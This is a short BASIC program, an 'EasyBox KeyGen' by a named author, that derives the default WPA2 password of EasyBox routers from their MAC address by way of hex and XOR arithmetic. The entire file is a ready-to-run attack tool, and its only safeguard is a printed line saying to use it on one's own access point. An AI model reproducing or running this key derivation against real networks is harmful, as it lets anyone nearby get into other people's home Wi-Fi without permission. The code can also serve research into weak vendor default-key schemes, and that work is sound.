Function DeHex(ByVal V_Hex As String) As Integer
	Dim X as Integer
	Dim L as Integer
	Dim D As Integer
	Dim T as Byte
	Dim V As Byte
	V_Hex = UCase(V_Hex)
	L = Len(V_Hex)
	For X = 1 To L
	    T = asc(Mid(V_Hex, X, 1))
	    Select Case T
	        Case 65 to 70: V = T - 55
	        Case Else: V = Val(chr(T))
	    End Select
	    D += V * 16 ^ (L - X)
	Next
	Return D
End Function

Dim MAC as String
Dim AS Integer M1, M2, M3, M4, M5, M6, M7, M8, M9, M10, M11, M12
Dim AS Integer K1, K2
Dim AS Integer S6, S7, S8, S9, S10
Dim AS Integer X1, X2, X3, Y1, Y2, Y3, Z1, Z2, Z3
Dim SMAC AS Integer
Dim Key AS String

Print "EasyBox KeyGen for Standart WPA2-Password"
Print "By Sebastian Petters"
Print "http://www.wotan.cc"
Print ""
Print "Use this only on your own AccessPoint!"
Print ""
Print "Enter MAC-Adress in following format: 01234567890A"

Input "MAC: ", MAC

M1 = DeHex(MID(MAC, 1, 1))
M2 = DeHex(MID(MAC, 2, 1))
M3 = DeHex(MID(MAC, 3, 1))
M4 = DeHex(MID(MAC, 4, 1))
M5 = DeHex(MID(MAC, 5, 1))
M6 = DeHex(MID(MAC, 6, 1))
M7 = DeHex(MID(MAC, 7, 1))
M8 = DeHex(MID(MAC, 8, 1))
M9 = DeHex(MID(MAC, 9, 1))
M10 = DeHex(MID(MAC, 10, 1))
M11 = DeHex(MID(MAC, 11, 1))
M12 = DeHex(MID(MAC, 12, 1))

SMAC = DeHex(Hex(M9) & Hex(M10) & Hex(M11) & Hex(M12))

Print "SMAC: " & SMAC

If Len(Str(SMAC)) = 5 Then
	S6 = Val(Mid(Str(SMAC), 1, 1))
	S7 = Val(Mid(Str(SMAC), 2, 1))
	S8 = Val(Mid(Str(SMAC), 3, 1))
	S9 = Val(Mid(Str(SMAC), 4, 1))
	S10 = Val(Mid(Str(SMAC), 5, 1))
ElseIf Len(Str(SMAC)) = 4 Then
	S6 = 0
	S7 = Val(Mid(Str(SMAC), 1, 1))
	S8 = Val(Mid(Str(SMAC), 2, 1))
	S9 = Val(Mid(Str(SMAC), 3, 1))
	S10 = Val(Mid(Str(SMAC), 4, 1))
ElseIf Len(Str(SMAC)) = 3 Then
	S6 = 0
	S7 = 0
	S8 = Val(Mid(Str(SMAC), 1, 1))
	S9 = Val(Mid(Str(SMAC), 2, 1))
	S10 = Val(Mid(Str(SMAC), 3, 1))
ElseIf Len(Str(SMAC)) = 2 Then
	S6 = 0
	S7 = 0
	S8 = 0
	S9 = Val(Mid(Str(SMAC), 1, 1))
	S10 = Val(Mid(Str(SMAC), 2, 1))
ElseIf Len(Str(SMAC)) = 1 Then
	S6 = 0
	S7 = 0
	S8 = 0
	S9 = 0
	S10 = Val(Mid(Str(SMAC), 1, 1))
End If

Print "SSID: EasyBox-" & Hex(M7) & Hex(M8) & Hex(M9) & Hex(M10) & S6 & S10

K1 = S7 + S8 + M11 + M12
K2 = M9 + M10 + S9 + S10
K1 = DeHex(Mid(Hex(K1), Len(Hex(K1)), 1))
K2 = DeHex(Mid(Hex(K2), Len(Hex(K2)), 1))

Print "K1: " & Hex(K1)
Print "K2: " & Hex(K2)

X1=K1 XOR S10
X2=K1 XOR S9
X3=K1 XOR S8

Y1=K2 XOR M10
Y2=K2 XOR M11
Y3=K2 XOR M12

Z1=M11 XOR S10
Z2=M12 XOR S9
Z3=K1 XOR K2

' X1 Y1 Z1 X2 Y2 Z2 X3 Y3 Z3

Key = Hex(X1) & Hex(Y1) & Hex(Z1) & Hex(X2) & Hex(Y2) & Hex(Z2) & Hex(X3) & Hex(Y3) & Hex(Z3)
Print "WPA-Key: " & Key
Print ""
Input "Press Enter to quit", Key
